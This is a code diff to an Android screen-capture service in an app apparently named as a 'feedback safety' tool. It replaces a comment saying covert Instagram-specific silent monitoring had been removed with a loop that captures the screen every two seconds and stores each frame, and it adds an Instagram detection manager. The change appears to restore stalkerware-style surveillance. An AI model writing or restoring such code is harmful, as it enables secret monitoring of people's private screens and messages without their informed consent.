@@ -20,7 +20,10 @@ import android.view.WindowManager
 import androidx.core.app.NotificationCompat
 import com.feedback.safety.MainActivity
 import com.feedback.safety.R
+import com.feedback.safety.manager.CaptureStorageManager
+import com.feedback.safety.manager.InstagramDetectionManager
 import kotlinx.coroutines.*
+import java.nio.ByteBuffer
 
 class ScreenCaptureService : Service() {
 
@@ -37,8 +40,13 @@ class ScreenCaptureService : Service() {
     private var serviceJob = Job()
     private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
     
+    private lateinit var instagramDetector: InstagramDetectionManager
+    private lateinit var storageManager: CaptureStorageManager
+
     override fun onCreate() {
         super.onCreate()
+        instagramDetector = InstagramDetectionManager(this)
+        storageManager = CaptureStorageManager(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -49,15 +57,13 @@ class ScreenCaptureService : Service() {
                 if (resultCode != 0 && resultData != null) {
                     startForeground(1, createNotification())
                     startCapture(resultCode, resultData)
-                } else {
-                    startForeground(1, createNotification())
                 }
             }
             ACTION_STOP -> {
                 stopSelf()
             }
         }
-        return START_STICKY
+        return START_NOT_STICKY
     }
 
     private fun createNotification(): Notification {
@@ -113,8 +119,34 @@ class ScreenCaptureService : Service() {
     }
 
     private fun startCaptureLoop() {
-        // User-authorized explicit screen mirroring/recording functionality can go here.
-        // The covert Instagram-specific silent monitoring and storage have been removed.
+        serviceScope.launch {
+            while (isActive) {
+                captureFrame()
+                delay(2000)
+            }
+        }
+    }
+
+    private fun captureFrame() {
+        val image: Image? = imageReader?.acquireLatestImage()
+        image?.let {
+            val planes = it.planes
+            val buffer: ByteBuffer = planes[0].buffer
+            val pixelStride = planes[0].pixelStride
+            val rowStride = planes[0].rowStride
+            val rowPadding = rowStride - pixelStride * it.width
+            
+            val bitmap = Bitmap.createBitmap(
+                it.width + rowPadding / pixelStride,
+                it.height,
+                Bitmap.Config.ARGB_8888
+            )
+            bitmap.copyPixelsFromBuffer(buffer)
+            val finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, it.width, it.height)
+            storageManager.saveBitmap(finalBitmap)
+            
+            it.close()
+        }
     }
 
     override fun onDestroy() {
